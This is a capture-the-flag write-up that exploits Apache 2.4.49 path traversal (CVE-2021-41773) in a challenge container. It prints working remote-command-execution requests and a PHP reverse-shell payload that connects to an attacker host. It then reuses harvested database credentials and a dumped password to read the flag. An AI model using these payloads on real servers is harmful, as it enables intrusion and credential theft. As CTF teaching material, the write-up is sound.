Making a sample request allows us to the obtain the following server banner:

```  
Server: Apache/2.4.49 (Debian)  
```

This tells us that the instance is vulnerable to
[CVE-2021-41773](https://blog.qualys.com/vulnerabilities-threat-
research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-
cve-2021-41773-cve-2021-42013).

Making the following request confirms exploitability.

```  
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1  
Host: 139.59.2.201  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Connection: close  
Upgrade-Insecure-Requests: 1  
Content-Length: 22

echo;whoami;ls -la /  
```

The response yields a directory listing including a `flag.txt` file owned by
`root:vulncon` along  
with the output of `id` indicating that we have code execution as the `www-
data` user. This means  
that we will have to perform privilege escalation before we can read the flag.

```  
HTTP/1.1 200 OK  
Date: Sat, 04 Dec 2021 20:02:50 GMT  
Server: Apache/2.4.49 (Debian)  
Connection: close  
Content-Length: 1632

www-data  
total 2136  
drwxr-xr-x   1 root root       4096 Dec  4 06:22 .  
drwxr-xr-x   1 root root       4096 Dec  4 06:22 ..  
-rwxr-xr-x   1 root root          0 Dec  4 06:22 .dockerenv  
-rw-r--r--   1 root root    1402156 Nov  6 06:12 apache2-bin_2.4.49-4_amd64.deb  
-rw-r--r--   1 root root     159956 Nov  6 06:12 apache2-data_2.4.49-4_all.deb  
-rw-r--r--   1 root root     253952 Nov  6 06:12 apache2-utils_2.4.49-4_amd64.deb  
-rw-r--r--   1 root root     268632 Nov  6 06:12 apache2_2.4.49-4_amd64.deb  
drwxr-xr-x   1 root root       4096 Dec  4 06:21 bin  
drwxr-xr-x   2 root root       4096 Aug 22 17:00 boot  
drwxr-xr-x   5 root root        340 Dec  4 06:22 dev  
-rwxr-xr-x   1 root root         68 Nov  6 06:12 entry.sh  
drwxr-xr-x   1 root root       4096 Dec  4 06:22 etc  
-r--r-----   1 root vulncon      24 Dec  4 06:21 flag.txt  
drwxr-xr-x   1 root root       4096 Dec  4 06:22 home  
drwxr-xr-x   1 root root       4096 Dec  1 00:00 lib  
drwxr-xr-x   2 root root       4096 Dec  1 00:00 lib64  
drwxr-xr-x   2 root root       4096 Dec  1 00:00 media  
drwxr-xr-x   2 root root       4096 Dec  1 00:00 mnt  
drwxr-xr-x   2 root root       4096 Dec  1 00:00 opt  
dr-xr-xr-x 162 root root          0 Dec  4 06:22 proc  
drwx------   2 root root       4096 Dec  1 00:00 root  
drwxr-xr-x   1 root root       4096 Dec  4 06:22 run  
drwxr-xr-x   1 root root       4096 Dec  4 06:21 sbin  
drwxr-xr-x   2 root root       4096 Dec  1 00:00 srv  
dr-xr-xr-x  13 root root          0 Dec  4 10:45 sys  
drwxrwxrwt   1 root root       4096 Dec  4 18:51 tmp  
drwxr-xr-x   1 root root       4096 Dec  1 00:00 usr  
drwxr-xr-x   1 root root       4096 Dec  4 06:21 var

```

A reverse shell is obtained with the following payload:

```  
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1  
Host: 139.59.2.201  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Connection: close  
Upgrade-Insecure-Requests: 1  
Content-Length: 132

echo;php -r '$sock=fsockopen("attacker.pwn.sg",1337);$proc=proc_open("/bin/sh
-i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

```

Once we have a shell, we can read the mysql credentials from `connection.php`.
Unfortunately, there  
is no `mysql` binary available in the container so we just `scp` up one and
use it to dump the  
database.

```console  
$ /tmp/mysql -h apache_sql -u vulncon -pa8amisa^d8 -h apache_sql -e "use
field_data; show tables; select * from login_details"  
mysql: [Warning] Using a password on the command line interface can be
insecure.  
Tables_in_field_data  
login_details  
id      first_name      last_name       password        email   internal_user  
1       John    Doe     Pass123 [email protected]       false  
2       alice   alice   123     [email protected]       false  
3       boby    bob     rooe    [email protected]       false  
4       rock    johnson 3131313 [email protected]       false  
5       ronald  duck    recking [email protected]       false  
6       jenny   jen     rolaa   [email protected]       false  
7       fish    fight   fishreal        [email protected]       false  
8       vulncon root    jh^sJ9sd        [email protected]       true  
9       many    many    many-s  [email protected]       false  
10      borish  bob     roled   [email protected]       false  
11      rocket  robbin  robitu  [email protected]       false  
12      karma   karmait karma   [email protected]       false  
13      dolly   red     dolly   [email protected]       false  
14      alice   wonder  alice123#       [email protected]       false  
15      ringit  many    ringit#@#       [email protected]       false  
16      rahul   re      3232qss [email protected]       false  
17      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin    sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
18      lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
19      backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List
Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
20      systemd-timesync:x:101:101:systemd Time
Synchronization,,,:/run/systemd:/usr/sbin/nologin       systemd-
network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false tss:x:105:111:TPM
software stack,,,:/var/lib/tpm:/bin/false  
21      messagebus:x:107:113::/nonexistent:/usr/sbin/nologin
redsocks:x:108:114::/var/run/redsocks:/usr/sbin/nologin
rwhod:x:109:65534::/var/spool/rwho:/usr/sbin/nologin
iodine:x:110:65534::/run/iodine:/usr/sbin/nologin
tcpdump:x:111:115::/nonexistent:/usr/sbin/nologin  
22      _rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:115:122:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:116:65534::/run/sshd:/usr/sbin/nologin
statd:x:117:65534::/var/lib/nfs:/usr/sbin/nologin  
23      avahi:x:119:126:Avahi mDNS daemon,,,:/run/avahi-
daemon:/usr/sbin/nologin
stunnel4:x:120:127::/var/run/stunnel4:/usr/sbin/nologin Debian-
snmp:x:121:128::/var/lib/snmp:/bin/false speech-dispatcher:x:122:29:Speech
Dispatcher,,,:/run/speech-dispatcher:/bin/false
sslh:x:123:129::/nonexistent:/usr/sbin/nologin  
24      saned:x:125:133::/var/lib/saned:/usr/sbin/nologin
inetsim:x:126:135::/var/lib/inetsim:/usr/sbin/nologin
colord:x:127:136:colord colour management
daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:128:137::/var/lib/geoclue:/usr/sbin/nologin   king-
phisher:x:129:138::/var/lib/king-phisher:/usr/sbin/nologin  
25      kali:x:1000:1000:Devang Solanki,,,:/home/kali:/usr/bin/zsh
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
strongswan:x:131:65534::/var/lib/strongswan:/usr/sbin/nologin   nm-
openvpn:x:132:141:NetworkManager
OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
lightdm:x:133:142:Light Display Manager:/var/lib/lightdm:/bin/false  
26      dnsmasq:x:135:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
libvirt-qemu:x:64055:106:Libvirt Qemu,,,:/var/lib/libvirt:/usr/sbin/nologin  
$  
```

Now that we have obtained the password to `vulncon`, we can just `su` and
login as that user before  
reading the flag.

```console  
$ su vulncon  
Password: jh^sJ9sd  
ls -la  
total 4204  
drwxrwxrwt 1 root     root        4096 Dec  4 22:20 .  
drwxr-xr-x 1 root     root        4096 Dec  4 06:22 ..  
-rw-r--r-- 1 www-data www-data       8 Dec  4 19:07 flag.txt  
-rwxr-xr-x 1 www-data www-data     250 Dec  4 20:07 fwUzzNz  
-rw-r--r-- 1 www-data www-data    9398 Dec  4 20:15 linPE  
-rwxr-xr-x 1 www-data www-data  959800 Dec  4 21:41 nc  
-rwxr-xr-x 1 www-data www-data 2914424 Dec  4 21:42 ncat  
-rw-r--r-- 1 www-data www-data       0 Dec  4 18:51 out  
-rwxr-xr-x 1 www-data www-data  375176 Dec  4 22:03 socat  
-rw-r--r-- 1 www-data www-data    4404 Dec  4 16:11 typescript  
-rwxrwxrwx 1 www-data www-data       3 Dec  4 17:40 vulncon  
-rw-r--r-- 1 www-data www-data     154 Dec  4 20:10 x  
-rw-r--r-- 1 www-data www-data      12 Dec  4 17:58 yes.sh  
cat /flag.txt  
VULNCON{cv3_1s_aw3s0m3}  
```

**Flag:** `VULNCON{cv3_1s_aw3s0m3}`

Original writeup (https://nandynarwhals.org/vulncon-ctf-2021/#webhealth-
portal).